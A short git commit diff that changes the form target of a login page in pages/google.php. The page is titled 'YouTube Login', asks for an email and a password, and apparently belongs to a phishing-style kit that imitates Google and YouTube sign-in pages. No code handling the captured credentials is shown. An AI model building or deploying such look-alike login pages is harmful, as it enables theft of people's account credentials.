aff509eb68f02c9a346be08aa46e41e2c0a35e71
Arindam Makar <31692664+deadxfire@users.noreply.github.com>
2024-08-03 09:04:06 -0400

    Update google.php

--- pages/google.php
+++ pages/google.php
@@ -3,7 +3,7 @@
     <title>YouTube Login</title>
 </head>
 <body>
-    <form action="youtube_login.php" method="POST">
+    <form action="google_login.php" method="POST">
         <input type="text" name="email" placeholder="Email">
         <input type="password" name="password" placeholder="Password">
         <input type="submit" value="Log In">
